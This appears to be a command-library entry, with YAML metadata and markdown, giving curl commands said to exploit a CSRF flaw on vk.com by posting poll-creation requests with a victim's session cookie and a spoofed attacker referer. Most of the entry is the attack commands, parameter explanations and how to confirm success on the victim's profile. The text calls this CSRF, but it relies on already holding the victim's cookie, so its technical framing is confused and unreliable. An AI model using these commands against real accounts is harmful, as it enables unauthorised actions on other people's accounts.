---
data: >-
  curl -X POST 'https://vk.com/al_apps.php' -d 'act=polls_create' -d
  'app_id=123456' -d 'poll_question=Test Poll' -d 'poll_options=Option1|Option2'
  -H 'Cookie: remixsid=VICTIM_SESSION;' --referer 'https://attacker.com'
tags:
  - csrf
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:23.544Z'
id: bb1c376e-01ef-4ade-aa5c-d0c552212259
verified: false
validated: true
submitted: true
---
# curl-csrf-poll-create

## Command

```bash
curl -X POST 'https://vk.com/al_apps.php' \
  -d 'act=polls_create' \
  -d 'app_id=123456' \
  -d 'poll_question=Test Poll' \
  -d 'poll_options=Option1|Option2' \
  -H 'Cookie: remixsid=VICTIM_SESSION;' \
  --referer 'https://attacker.com'
```

## Description

This curl command exploits the CSRF vulnerability in VK.com by posting poll creation data without a token, using a known app ID to act on behalf of the authenticated user. Use it to test or demonstrate unauthorized content creation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-d 'key=value'` | Form data fields for act, app_id, etc. | Yes |
| `-H 'Cookie: ...'` | Victim's session cookie | Yes |
| `--referer` | Fake referer to simulate cross-site request | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://vk.com/al_apps.php' -d 'act=polls_create' -d 'app_id=123456' -d 'poll_question=Malicious' -H 'Cookie: remixsid=abc123;'
```

### Advanced Usage

```bash
curl -X POST 'https://vk.com/al_apps.php' \
  -d 'act=polls_create' \
  -d 'app_id=123456' \
  -d 'poll_question=Test' \
  -d 'poll_options=Yes|No|Maybe' \
  -H 'Cookie: remixsid=abc123;' \
  -H 'User-Agent: Mozilla/5.0' \
  --referer 'https://fake.com' \
  -v
```

## Expected Output

HTTP 200 OK with JSON or HTML response indicating poll creation success, e.g., {"poll_id": "456"}. Verify by checking the victim's VK profile for the new poll.

## Related

- [[Related Procedure: Exploit-CSRF-to-Create-VK-Poll]]
